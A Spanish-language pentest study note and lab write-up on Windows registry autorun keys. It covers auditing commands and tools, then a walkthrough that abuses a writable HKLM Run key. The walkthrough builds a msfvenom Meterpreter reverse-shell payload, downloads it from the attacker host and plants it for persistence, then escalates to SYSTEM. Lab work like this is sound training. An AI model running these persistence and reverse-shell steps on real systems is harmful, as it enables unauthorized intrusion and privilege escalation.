
# Registry Autorun

## <mark style="color:purple;">Introducción</mark>

#### ¿Qué es el Registry Autorun?

El *autorun en el registro* son claves de Windows que permiten ejecutar programas **automáticamente al iniciar el sistema o al iniciar sesión**.

👉 Son muy usadas por:

* Software legítimo (antivirus, drivers, apps)
* Persistencia (malware / red team)

***

#### ¿Cómo funciona?

Windows, al arrancar o al hacer login, revisa ciertas claves del registro y ejecuta lo que haya en ellas.

Las más importantes:

```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

#### Diferencia clave

* **HKLM** → afecta a todos los usuarios (requiere admin)
* **HKCU** → solo al usuario actual (más común en ataques)
* **Run** → se ejecuta siempre
* **RunOnce** → se ejecuta una sola vez

#### ¿Por qué es importante?

Porque permite:

* Persistencia tras reinicio
* Ejecución automática de payloads
* Escalada indirecta (si apunta a binarios inseguros)

#### ¿Qué debes auditar?

1. Qué programas se ejecutan automáticamente
2. Rutas sospechosas o no estándar
3. Permisos del binario apuntado
4. Permisos del registro (ACL)

***

## <mark style="color:purple;">Comandos</mark>

### CMD

```powershell
# Ver claves Run (máquina)
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run

# Ver claves Run (usuario)
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

***

### PowerShell

```powershell
# Listar autoruns del sistema
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Autoruns del usuario
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```

#### Revisar el binario asociado

1. Copias la ruta que aparece
2. Revisas permisos:

```powershell
icacls "C:\ruta\programa.exe"
```

👉 Si ves:

* `Users:(M)`
* `Everyone:(F)`

→ 🚨 potencial vulnerabilidad

***

### Sysinternals

#### Autoruns.exe (Imprescindible)

{% embed url="<https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns>" %}

```powershell
autoruns.exe
```

<figure><img src="/files/m2c3K4BuDc2caeBHDA5r" alt=""><figcaption></figcaption></figure>

#### Qué revisar

* Pestaña **Logon**
* Entradas en:
  * Run
  * RunOnce

En Autoruns:

* Ocultar entradas de Microsoft (Options → Hide Microsoft Entries)
* Buscar rutas raras:
  * `C:\Users\`
  * `Temp`
  * `AppData`

***

#### AccessChk (permisos)

```powershell
accesschk.exe -wvu "Users" "C:\ruta\programa.exe"
```

👉 Ver si usuarios pueden modificar el ejecutable

***

### PowerUp

```powershell
Import-Module PowerUp.ps1
Get-RegAutoRun
```

***

### WinPEAS

```powershell
winpeas.exe
```

Sección:

```
Autoruns
```

***

## <mark style="color:purple;">Lab: Registry Autoruns</mark>

Se le proporcionará una máquina con interfaz gráfica Kali y una máquina con Windows.

HFS (Servidor de Archivos Simple) se ejecuta al iniciar el sistema Windows. Ejecute la utilidad [Sysinternals autoruns](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns) para localizar la ubicación del registro de HFS para la escalada de privilegios.

{% hint style="info" %}
Nota: Utilice el ordenador del estudiante para todas las actividades de escalada de privilegios. El acceso de administrador se concede únicamente para iniciar y cerrar sesión.
{% endhint %}

**Objetivo**: Obtener acceso a una sesión de Meterpreter con altos privilegios.

#### Lab

En este laboratorio podemos alternar fácilmente entre la máquina Kali, una máquina Windows de atacante y la máquina Windows objetivo y tenemos todos los scripts disponibles en el escritorio de la máquina de atacante Windows:

<figure><img src="/files/3exL6MvEXyUOsgaSYBbV" alt=""><figcaption></figcaption></figure>

Las máquinas Windows tienen la misma IP, pero usan usuarios distintos, la `Attacker` el usuario student, y la `Target` el usuario administrator.

### Análisis con Autoruns

A ejecutar autoruns vemos que detecta algunos programas que se auto-ejecutan al iniciar Windows,y nos marca en rojo los que pueden ser maliciosos:

<figure><img src="/files/srQdixSd3l3dmMGWY1Rs" alt=""><figcaption></figcaption></figure>

Si hacemos docle click sobre el ejecutable malicioso directamente se abre el registro:

<figure><img src="/files/jv9hkbVTHrrgpC9Mj4MD" alt=""><figcaption></figcaption></figure>

### Ver permisos del directorio

```powershell
PS C:\Users\student> Get-Acl -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' | Format-List

Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : PRIV-ESC\student Allow  FullControl
         BUILTIN\Users Allow  ReadKey
         BUILTIN\Users Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
         -2147483648
Audit  :
Sddl   : O:SYG:SYD:AI(A;CI;KA;;;S-1-5-21-3061667678-1811888172-2700530533-1008)(A;ID;KR;;;BU)(A;CIIOID;GR;;;BU)(A;ID;KA
         ;;;BA)(A;CIIOID;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;I
         D;KR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A
         ;CIIOID;GR;;;S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934
         681)
```

Observamos que el usuario student tiene FullControl sobre el directorio:

```powershell
Access : PRIV-ESC\student Allow  FullControl
```

### Crear registro malicioso

En el editor de registros: New > String Value

<figure><img src="/files/5v9DfdRkvatPCwizsIKs" alt=""><figcaption></figcaption></figure>

Al nuevo string le llamaremos por ejemplo `Hacker`.

#### Crear carpeta

Creamos una carpeta `tool` por ejemplo en el escritorio donde se alojará nuestro payload:

```powershell
PS C:\Users\student\Desktop> mkdir tool

    Directory: C:\Users\student\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/31/2026  10:44 AM                tool
```

#### MSF Venom

Crearemos un ejecutable malicioso:

<pre class="language-bash"><code class="lang-bash">┌──(root㉿attackdefense)-[~]
└─# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.49.2 LPORT=4444 -f exe > malware.exe
<strong>
</strong><strong>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</strong>[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
</code></pre>

#### Multi Handler

Abrimos un listener multi-handler para recibir el Meterpreter:

```bash
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.49.2
set LPORT 4444
set InitialAutoRunScript post/windows/manage/migrate
exploit

[*] Started reverse TCP handler on 10.10.49.2:4444 
```

#### Envio del ejecutable malicioso

```bash
# En Kali Linux
┌──(root㉿attackdefense)-[~]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```powershell
# En Windows
iwr -UseBasicParsing -Uri 'http://10.10.49.2/malware.exe' -OutFile 'malware.exe'
```

Con eso ya tenemos nuestro `malware.exe` en la carpeta tool:

```powershell
PS C:\Users\student\Desktop\tool> ls

    Directory: C:\Users\student\Desktop\tool

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/31/2026  10:49 AM          73802 malware.exe
```

### Editar autorun

En el editor de registro incluimos la ruta al ejecutable malicioso que se ejecutará automáticamente:

<figure><img src="/files/ySplAWuxa02MqaRoUmzs" alt=""><figcaption></figcaption></figure>

### Reiniciar equipo

Para probarlo con acceso admin, reiniciaremos el equipo desde el Target Machine (que usa el usuario administrador):

```powershell
PS C:\Users\Administrator> shutdown /l
```

Eso reinicia el equipo, ejecuta el `malware.exe` automáticamente y recibimos la sesión de Meterpreter como Administrator:

```bash
[*] Started reverse TCP handler on 10.10.49.2:4444 
[*] Sending stage (176198 bytes) to 10.2.19.27
[*] Session ID 1 (10.10.49.2:4444 -> 10.2.19.27:49768) processing InitialAutoRunScript 'post/windows/manage/migrate'
[*] Running module against PRIV-ESC
[*] Current server process: malware.exe (2288)
[*] Spawning notepad.exe process to migrate into
[*] Spoofing PPID 0
[*] Migrating into 5604
[+] Successfully migrated into process 5604
[*] Meterpreter session 1 opened (10.10.49.2:4444 -> 10.2.19.27:49768) at 2026-03-31 16:32:20 +0530

meterpreter > getuid
Server username: PRIV-ESC\Administrator
```

Con Administrator escalamos a SYSTEM fácilmente:

```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Acceso a la flag

```powershell
meterpreter > ls
Listing: C:\Users\Administrator\Downloads
=========================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2020-10-27 15:14:30 +0530  desktop.ini
100666/rw-rw-rw-  32    fil   2020-10-28 11:43:32 +0530  flag.txt

meterpreter > cat flag.txt 
b5eda0a74558a342cf659187********
```
